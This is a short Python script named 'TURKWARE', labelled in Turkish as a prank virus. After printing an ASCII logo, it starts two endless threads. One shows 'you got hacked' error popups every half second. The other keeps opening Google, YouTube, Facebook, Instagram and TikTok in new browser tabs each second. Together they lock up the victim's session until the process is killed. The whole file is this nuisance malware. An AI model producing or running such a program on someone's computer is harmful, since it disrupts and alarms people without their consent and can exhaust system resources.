import os
import time
import webbrowser
import threading
import tkinter as tk
from tkinter import messagebox

def ascii_logo():
    logo = """
████████╗██╗   ██╗██████╗ ██╗  ██╗██╗    ██╗ █████╗ ██████╗ ███████╗
╚══██╔══╝██║   ██║██╔══██╗██║  ██║██║    ██║██╔══██╗██╔══██╗██╔════╝
   ██║   ██║   ██║██████╔╝███████║██║ █╗ ██║███████║██████╔╝█████╗  
   ██║   ██║   ██║██╔═══╝ ██╔══██║██║███╗██║██╔══██║██╔═══╝ ██╔══╝  
   ██║   ╚██████╔╝██║     ██║  ██║╚███╔███╔╝██║  ██║██║     ███████╗
   ╚═╝    ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚══════╝
    """
    print(logo)
    print("TURKWARE YÜKLENDİ - ŞAKA VİRÜSÜ BAŞLIYOR...\n")

def show_popup():
    while True:
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("TURKWARE", "HACKLENDİN 😂😂😂")
        root.destroy()
        time.sleep(0.5)

def open_websites():
    urls = [
        "https://www.google.com",
        "https://www.youtube.com",
        "https://www.facebook.com",
        "https://www.instagram.com",
        "https://www.tiktok.com"
    ]
    while True:
        for url in urls:
            webbrowser.open_new_tab(url)
            time.sleep(1)

def main():
    os.system("cls" if os.name == "nt" else "clear")
    ascii_logo()

    threading.Thread(target=show_popup).start()
    threading.Thread(target=open_websites).start()

if __name__ == "__main__":
    main()
